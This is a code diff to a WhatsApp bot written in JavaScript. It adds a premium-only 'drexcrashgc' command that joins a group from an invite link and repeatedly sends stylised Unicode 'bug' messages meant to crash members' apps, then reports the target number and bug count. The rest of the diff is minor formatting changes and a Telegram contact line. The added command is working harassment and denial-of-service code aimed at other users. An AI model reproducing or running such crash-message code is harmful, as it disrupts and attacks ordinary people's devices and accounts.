@@ -2151,13 +2151,49 @@ await ryozingod.sendMessage(m.chat, { audio: night, mimetype: 'audio/mpeg', ptt:
 }
 break
 
+case 'drexcrashgc': {
+inireact()
+if (!isPremium) return xgreply(mess.premium)
+if (!text) return xgreply(`Example: ${prefix + command} https://chat.whatsapp.com/IwNg19SowhdI`);
+let result = args[0].split('https://chat.whatsapp.com/,')[1]
+let gpJid = await ryozingod.groupAcceptInvite(result)
+jumlah = q.split(",")[1]
+bugq(gpJid, jumlah,  `ՙ͜͜ ꒷⃟༑🦠 𝐃𝐑𝚺𝐗̸͢𝚵𝐓𝐒͢𝐔𝐁𝛀͢𝐗𝐘𝐆͢𝚺𝐍 ⿻  𝐃𝐑𝚺𝐗 ⟠ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 💀̳̳͒ ꒷ ՚͜͜ `)
+await sleep(1000)
+await bugq(sendto, jumlah,  `💔'҉༑⃟𝐓𝐇𝚺͢𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝟎̸͢𝐗𝐘𝐆̸𝚵𝐍❤️‍🩹`)
+await sleep(1000)
+await bugq(sendto, jumlah,  `༑😈𝐏𝚯⃟𝐢𝐙𝟎𝐍 ⬪ 𝐙̸𝚺𝐓͢᪾𝐒𝐔𝐁𝚯⃟𝐗𝐆👿༑`)
+await sleep(1000)
+bugq(sendto, jumlah,  `ՙ͜͜ ꒷⃟༑🦠 𝐃𝐑𝚺𝐗̸͢𝚵𝐓𝐒͢𝐔𝐁𝛀͢𝐗𝐘𝐆͢𝚺𝐍 ⿻  𝐃𝐑𝚺𝐗 ⟠ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 💀̳̳͒ ꒷ ՚͜͜ `)
+await sleep(1000)
+await bugq(sendto, jumlah,  `💔'҉༑⃟𝐓𝐇𝚺͢𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝟎̸͢𝐗𝐘𝐆̸𝚵𝐍❤️‍🩹`)
+await sleep(1000)
+await bugq(sendto, jumlah,  `༑😈𝐏𝚯⃟𝐢𝐙𝟎𝐍 ⬪ 𝐙̸𝚺𝐓͢᪾𝐒𝐔𝐁𝚯⃟𝐗𝐆👿༑`)
+await sleep(1000)
+bugq(sendto, jumlah,  `ՙ͜͜ ꒷⃟༑🦠 𝐃𝐑𝚺𝐗̸͢𝚵𝐓𝐒͢𝐔𝐁𝛀͢𝐗𝐘𝐆͢𝚺𝐍 ⿻  𝐃𝐑𝚺𝐗 ⟠ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 💀̳̳͒ ꒷ ՚͜͜ `)
+await sleep(1000)
+await bugq(sendto, jumlah,  `💔'҉༑⃟𝐓𝐇𝚺͢𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝟎̸͢𝐗𝐘𝐆̸𝚵𝐍❤️‍🩹`)
+await sleep(1000)
+await bugq(sendto, jumlah,  `༑😈𝐏𝚯⃟𝐢𝐙𝟎𝐍 ⬪ 𝐙̸𝚺𝐓͢᪾𝐒𝐔𝐁𝚯⃟𝐗𝐆👿༑`)
+await sleep(1000)
+bugq(sendto, jumlah,  `ՙ͜͜ ꒷⃟༑🦠 𝐃𝐑𝚺𝐗̸͢𝚵𝐓𝐒͢𝐔𝐁𝛀͢𝐗𝐘𝐆͢𝚺𝐍 ⿻  𝐃𝐑𝚺𝐗 ⟠ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 💀̳̳͒ ꒷ ՚͜͜ `)
+await sleep(1000)
+await bugq(sendto, jumlah,  `💔'҉༑⃟𝐓𝐇𝚺͢𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝟎̸͢𝐗𝐘𝐆̸𝚵𝐍❤️‍🩹`)
+await sleep(1000)
+await bugq(sendto, jumlah,  `༑😈𝐏𝚯⃟𝐢𝐙𝟎𝐍 ⬪ 𝐙̸𝚺𝐓͢᪾𝐒𝐔𝐁𝚯⃟𝐗𝐆👿༑`)
+await sleep(1000)
+xgreply(mess.bugrespon + `\n❗Detail > \n🧪 Target Number: ${sendto} \n🧪 Bug Command : ${command}\n🧪 Bug Ammount: ${jumlah}`)
+}
+break
+
 case 'sc': case 'script': {
-xgreply(`🌤️𝐘𝐨𝐮 𝐩𝐫𝐨𝐛𝐚𝐛𝐥𝐲 𝐰𝐚𝐧𝐭 𝐭𝐡𝐞 𝐬𝐜𝐫𝐢𝐩𝐭, 𝐫𝐢𝐠𝐡𝐭? 𝐂𝐨𝐧𝐭𝐚𝐜 𝐨𝐰𝐧𝐞𝐫.
+inireact()
+xgreply(`> 🌤️𝐘𝐨𝐮 𝐩𝐫𝐨𝐛𝐚𝐛𝐥𝐲 𝐰𝐚𝐧𝐭 𝐭𝐡𝐞 𝐬𝐜𝐫𝐢𝐩𝐭, 𝐫𝐢𝐠𝐡𝐭? 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐨𝐰𝐧𝐞𝐫.
 
-❕𝐖𝐚𝐆𝐜 : ${global.yt}
-❗𝐓𝐠 : t.me/dark_intent
+> ❕𝐖𝐚𝐆𝐜 : ${global.yt}
+> ❗𝐓𝐠 : t.me/dark_intent
 
-😆 𝐋𝐨𝐥, 𝐢𝐭𝐬 𝐧𝐨𝐰𝐡𝐞𝐫𝐞 𝐭𝐨 𝐛𝐞 𝐟𝐨𝐮𝐧𝐝 `)
+> 😆 𝐋𝐨𝐥, 𝐢𝐭𝐬 𝐧𝐨𝐰𝐡𝐞𝐫𝐞 𝐭𝐨 𝐛𝐞 𝐟𝐨𝐮𝐧𝐝 `)
 }
 break
 
@@ -2174,7 +2210,7 @@ break
 
 case 'drex': {
 if (!isPremium) return xgreply(mess.premium)
-ryozingod.sendMessage(m.chat, { text: `𝐃𝐑𝚺𝐗 𝐂𝐑𝐀𝐒𝐇🤯`}, { quoted: ryobug })
+ryozingod.sendMessage(m.chat, { text: `> 𝐃𝐑𝚺𝐗 𝐂𝐑𝐀𝐒𝐇🤯`}, { quoted: ryobug })
 }
 break
 
